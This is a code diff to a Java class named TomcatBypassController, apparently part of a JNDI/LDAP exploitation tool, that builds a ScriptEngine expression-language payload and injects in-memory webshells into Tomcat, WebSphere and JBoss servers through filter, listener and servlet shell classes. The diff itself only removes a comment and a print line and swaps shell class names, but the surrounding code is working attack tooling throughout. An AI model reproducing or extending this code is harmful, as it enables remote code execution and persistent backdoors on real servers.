@@ -208,7 +208,6 @@ public class TomcatBypassController implements LdapController {
                     code = helper.injectWSWebsphereProxy();
                     break;
             }
-            // 创建有效负载所需的字符串模板，将其中的 {replacement} 替换为上面获取到的代码
             String payloadTemplate = "{" +
                     "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
                     ".newInstance().getEngineByName(\"JavaScript\")" +
@@ -220,7 +219,6 @@ public class TomcatBypassController implements LdapController {
             // 将条目发送至结果中，并将结果设置为成功
             result.sendSearchEntry(e);
             result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
-            System.out.println();
         } catch (Throwable er) {
             System.err.println("Error while generating or serializing payload");
             er.printStackTrace();
@@ -468,7 +466,7 @@ public class TomcatBypassController implements LdapController {
         }
 
         public String injectTomcatFilterJmx() throws Exception {
-            return InjShell.structureShellTom(TFJMX.class);
+            return InjShell.structureShellTom(TSMSFromJMXF.class);
         }
 
         public String injectTomcatFilterTh() throws Exception {
@@ -484,7 +482,7 @@ public class TomcatBypassController implements LdapController {
         }
 
         public String injectTomcatListenerTh() throws Exception {
-            return InjShell.structureShellTom(TLMSFromThreadLi.class);
+            return InjShell.structureShellTom(TFMSFromThreadLi.class);
         }
 
         public String injectTomcatServletJmx() throws Exception {
@@ -492,7 +490,7 @@ public class TomcatBypassController implements LdapController {
         }
 
         public String injectTomcatServletTh() throws Exception {
-            return InjShell.structureShellTom(TSMSFromThreadS.class);
+            return InjShell.structureShellTom(TFMSFromThreadS.class);
         }
 
         public String injectJBossFilter() throws Exception {
